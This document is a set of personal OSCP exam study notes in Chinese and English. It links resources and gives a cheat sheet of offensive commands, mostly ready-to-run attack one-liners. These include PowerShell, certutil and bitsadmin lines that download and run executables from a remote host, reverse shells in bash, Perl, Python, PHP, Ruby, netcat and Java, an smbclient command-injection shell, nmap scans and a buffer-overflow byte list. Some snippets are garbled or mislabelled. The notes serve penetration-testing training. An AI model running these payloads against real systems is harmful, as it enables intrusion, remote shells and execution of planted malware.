# OSCP learning

## 官方

* [官方考试说明](https://www.lshack.cn/wp-content/uploads/2019/02/lshack.cn_2019-02-12_09-29-54.pdf)
* [PWK FAQ](https://support.offensive-security.com/#!pwk-general-questions.md)
* [OSCP exam FAQ](https://support.offensive-security.com/oscp-faq/)
* [IRC](https://www.offensive-security.com/offsec-irc-guide/)

## 考试报名

## 资料链接

* [windows exploit](https://github.com/abatchy17/WindowsExploits)
* [OSCP like vulnhub](https://medium.com/@andr3w_hilton/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1)
* [OSCP official report](https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf)
* [smb 枚举](https://xax007.github.io/2019-01-12-smb-enumeration-checklist/)
* [reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [PHP reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
* [linux priv check](https://raw.githubusercontent.com/neal1991/htb/62d6df2d86669a2957418e74c3a79a535297f386/SolidState/linuxprivchecker.py)

## cheetsheet 

### 信息枚举

* [droopescan](

### linux 提权

#### 检查 SUID 

`find / -type f -perm -u=s 2>/dev/null`

### windows 提权
 * [windows 内核利用](https://github.com/51x/WHP)


### File transfer

#### python

```python
python -m SimpleHTTPServer 8000
```

#### php 5.4+

```php
php -S 0.0.0.0:8000
```

#### ruby

```ruby
ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
```

#### runby 1.9.2+

```ruby
 ruby -run -e httpd . -p 1337
 ```
 
 #### perl
 
 ```perl
perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
```

```perl
perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |"
```

### Download Files

#### powershell: download and execute

```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://1.2.3.4/5.exe','c:\download\a.exe');start-process 'c:\download\a.exe'
```

#### certutil: download and execute

```
certutil -urlcache -split -f http://1.2.3.4/5.exe c:\download\a.exe&&c:\download\a.exe
```

#### bitsadmin：download and execute 

```
bitsadmin /transfer n http://1.2.3.4/5.exe c:\download\a.exe && c:\download\a.exe
```

#### regsvr32

```
regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dl
```

#### curl 

```
curl http://1.2.3.4/backdoor
```

#### wget

```
curl http://1.2.3.4/backdoor
```

#### awk

```
awk 'BEGIN {
  RS = ORS = "\r\n"
  HTTPCon = "/inet/tcp/0/127.0.0.1/1337"
  print "GET /secret.txt HTTP/1.1\r\nConnection: close\r\n"    |& HTTPCon
  while (HTTPCon |& getline > 0)
      print $0
  close(HTTPCon)
}'
```
[more](https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/)

### 反弹 shell

#### smbclient

```
logon "./=`nohup nc 10.10.16.44 1234 -e /bin/bash`"
```

#### Bash 

Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

#### PERL 

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Python(2.7)

```python 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

#### Ruby

`ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

#### Netcat

`nc -e /bin/sh 10.0.0.1 1234`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

#### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm 

`xterm -display 10.0.0.1:1`


### nmap 

#### 端口探测

```
nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.5
```

```
nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
```

### 常用命令

#### 编译 windows 执行程序

```
i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
```

### buffer overflow

#### all ascii hex

````
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

  
